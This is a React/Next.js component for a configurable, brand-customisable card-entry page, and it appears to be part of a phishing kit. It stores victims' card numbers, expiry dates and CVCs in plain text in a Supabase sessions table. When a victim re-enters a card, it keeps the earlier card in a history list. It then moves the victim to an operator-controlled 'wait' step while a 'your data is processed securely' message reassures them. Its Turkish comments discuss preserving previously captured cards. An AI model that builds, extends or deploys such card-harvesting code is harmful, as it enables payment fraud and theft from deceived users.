"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      // ⚠️ DUZELTME (KART GECMIS BUTONU KAYIP HATA):
      //   ESKI KOD: setNumber(fd.cardNumber ?? "") / setExpiry / setCvc → UI'DA ESKI KARTI GÖSTERİYORDU.
      //   YENI KOD (SMS ILE AYNI MANTIK):
      //     1) setNumber("") / setExpiry("") / setCvc("") → UI INPUTLAR BOŞ (kullanıcı eski kartı GÖRMEZ).
      //     2) setSessionFormData(fd) → fd ESKİ KARTI KORUR (submitte prevCard = eski kart bulunur, history.push ✅).
      //     3) Supabase'te ESKİ kartı SİLME! Kalsın ki sonraki submitlerde history.push yapılabilsin.
      setSessionFormData(fd);
      setNumber("");
      setExpiry("");
      setCvc("");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Bitte geben Sie ein gueltiges Ablaufdatum ein (MM/JJ).");
      return;
    }
    if (!cvcValid) {
      setMsg("Bitte geben Sie eine gueltige CVC/CVV ein (3 oder 4 Ziffern).");
      return;
    }
    setSaving(true);
    setMsg(null);

    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
    let baseFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* fresh okuma basarisizsa state ile devam et */
    }

    // ⭐ KART GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once cardNumber DOLUYSA)
    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) KART BILGISINI PUSH ET!
    //   Boylece: kolon = YENİ kart (2. kart), history = ESKI kart (1. kart → gorunur).
    const prevCard = String((baseFormData as any).cardNumber || "").trim();
    const prevCardExp = String((baseFormData as any).cardExpiry || "").trim();
    const prevCardCvc = String((baseFormData as any).cardCvc || "").trim();
    const isFirstCardEntry = prevCard.length === 0;
    const cardFormHistory: any[] = Array.isArray((baseFormData as any).cardFormHistory)
      ? (baseFormData as any).cardFormHistory.slice()
      : [];
    if (!isFirstCardEntry) {
      cardFormHistory.push({
        htmlStepLabel: "KARTENDATEN",
        capturedAt: new Date().toISOString(),
        cardNumber: prevCard,
        cardExpiry: prevCardExp,
        cardCvc: prevCardCvc,
      });
    }

    const nextFormData = {
      ...baseFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
      cardFormHistory,
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Speichern fehlgeschlagen.");
    else {
      setSessionFormData(nextFormData);
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
            Ungueltiger Link.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
          <div className="mb-6 flex items-start justify-between gap-4">
            <div className="min-w-0">
              <h2 className="a3d-title text-[24px] leading-tight">{settings.card_title}</h2>
              <p className="a3d-sub mt-2 text-sm font-medium">{settings.card_subtitle}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="h-11 w-11 shrink-0 object-contain"
              id="card-brand-logo"
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <label className="block text-[13px] font-semibold text-[#344054]">
              {settings.card_number_label}
              <div className="relative mt-2">
                <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
                  <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                    <path d="M3 10.5h18" />
                  </svg>
                </div>
                <input
                  inputMode="numeric"
                  className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.18em]"
                  value={number}
                  onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                  autoComplete="cc-number"
                />
              </div>
            </label>
            <div className="grid grid-cols-2 gap-3">
              <label className="block text-[13px] font-semibold text-[#344054]">
                {settings.card_expiry_label}
                <div className="relative mt-2">
                  <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
                    <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
                      <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
                    </svg>
                  </div>
                  <input
                    placeholder="MM/YY"
                    className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    autoComplete="cc-exp"
                    inputMode="numeric"
                    maxLength={5}
                  />
                </div>
              </label>
              <label className="block text-[13px] font-semibold text-[#344054]">
                {settings.card_cvv_label}
                <div className="relative mt-2">
                  <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
                    <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                      <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    inputMode="numeric"
                    maxLength={4}
                    className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.14em]"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    autoComplete="cc-csc"
                  />
                </div>
              </label>
            </div>

            {!expiryValid && expiry.length > 0 ? (
              <p className="text-xs font-medium text-red-500">Das Ablaufdatum muss im Format MM/JJ sein.</p>
            ) : null}

            {!cvcValid && cvc.length > 0 ? (
              <p className="text-xs font-medium text-red-500">Die CVV muss 3 oder 4 Ziffern enthalten.</p>
            ) : null}

            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}

            <button
              type="submit"
              disabled={saving || !expiryValid || !cvcValid}
              className="a3d-btn w-full px-6 py-4 text-[16px]"
            >
              {saving ? "Wird gesendet..." : settings.card_button}
            </button>

            <div className="flex justify-center pt-1">
              <div className="a3d-pill">
                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <span>Ihre Daten werden sicher verarbeitet.</span>
              </div>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}
